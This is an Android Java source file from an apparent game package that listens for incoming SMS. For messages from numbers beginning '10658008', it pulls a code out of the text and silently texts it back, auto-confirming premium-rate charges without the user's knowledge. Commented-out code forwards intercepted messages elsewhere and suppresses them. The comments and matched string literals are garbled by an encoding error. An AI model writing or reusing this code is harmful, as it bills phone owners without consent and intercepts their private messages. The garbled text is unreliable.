package com.game5a.sms;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {
	private static String ACTION_SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

	private static String SENDER_NUMBER_HEAD = "10658008";

	private static Activity activity;

	public static void Init(Activity a) {
		activity = a;
		activity.registerReceiver(new SmsReceiver(), new IntentFilter(ACTION_SMS_RECEIVED));
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		// �ж���ϵͳ���ţ�   
		if (intent.getAction().equals(ACTION_SMS_RECEIVED)) {
//			StringBuffer sb = new StringBuffer();
			String sender = null;
			String content = null;
			//			String sendtime = null;
			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				// ͨ��pdus��ý��յ������ж�����Ϣ����ȡ�������ݣ�   
				Object[] pdus = (Object[]) bundle.get("pdus");
				// �������Ŷ������飻   
				SmsMessage[] mges = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					// ��ȡ�����������ݣ���pdu��ʽ��,�����ɶ��Ŷ���   
					mges[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				}
				SmsMessage mge = mges[0];
//				for (SmsMessage mge : mges) {
					sender = mge.getDisplayOriginatingAddress();// ��ȡ���ŵķ�����   
					content = mge.getMessageBody();// ��ȡ���ŵ�����   

					//					sb.append("�������ԣ�" + sender + "\n");
					//					sb.append("�������ݣ�" + content);

					//					Date date = new Date(mge.getTimestampMillis());
					//					SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
					//					sendtime = format.format(date);// ��ȡ���ŷ���ʱ�䣻  

					//					SmsManager manager = SmsManager.getDefault();
					//					manager.sendTextMessage("5556", null, "������:" + sender + "-----����ʱ��:" + sendtime + "----����:" + content, null, null);//�����ص��Ķ��ŷ��͵�ָ�����ֻ����˴�Ϊ5556;
					//					if ("5556".equals(sender)) {
					//						//�����ֻ���Ϊ5556�Ķ��ţ����ﻹ����ʱ��һЩ������Ѹ���Ϣ���͵������˵��ֻ��ȵȡ�   
					//						abortBroadcast();
					//					}

					//Toast.makeText(context, sb.toString(), Toast.LENGTH_LONG).show();

					System.out.println("sender: " + sender);
					
					if (sender.startsWith(SENDER_NUMBER_HEAD)) {
						//�������´���
						//this.abortBroadcast();
						String str0 = "�ظ�����";
						String str1 = "��";
						int index0 = content.indexOf(str0);
						//System.out.println("index0: " + index0);
						if (index0 < 0) {
							return;
						}
						index0 += str0.length();
						int index1 = content.indexOf(str1, index0);
						//System.out.println("index1: " + index1);
						if (index1 < 0) {
							return;
						}
						String numStr = content.substring(index0, index1);
						System.out.println("Revert Num: " + numStr);
						SmsManager sms = SmsManager.getDefault();
						sms.sendTextMessage(sender, null, numStr, null, null);

					}

//				}

			}
		}
	}
}